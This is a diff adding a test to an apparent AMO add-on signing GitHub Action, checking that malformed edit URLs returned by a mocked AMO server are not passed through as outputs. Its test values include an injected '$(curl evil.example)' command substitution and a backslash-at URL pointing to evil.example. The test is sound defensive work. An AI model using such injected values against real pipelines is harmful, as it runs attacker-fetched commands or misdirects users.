@@ -133,6 +133,18 @@ describe('action', () => {
     assert.match(run.stdout, /^Waiting up to 15 minutes for AMO to sign version 1\.4\.0\.$/m);
   });
 
+  it('sets no edit-url when AMO returns one that is not a canonical URL on its host', async () => {
+    for (const editUrl of [`${amo.base}/en-US/\n$(curl evil.example)`, `${amo.base}\\@evil.example/`]) {
+      amo.reset();
+      amo.addVersion({ version: '1.4.0', channel: 'unlisted' });
+      amo.fault('version', { mutate: (body) => ({ ...body, edit_url: editUrl }) });
+      const run = await runAction(baseInputs('1.4.0'));
+      assert.equal(run.code, 0, run.stdout);
+      assert.equal(run.outputs.result, 'skipped');
+      assert.equal(run.outputs['edit-url'], undefined, JSON.stringify(editUrl));
+    }
+  });
+
   it('skips an existing version on a re-run and reports it', async () => {
     const version = amo.addVersion({ version: '1.4.0', channel: 'unlisted' });
     const run = await runAction(baseInputs('1.4.0'));
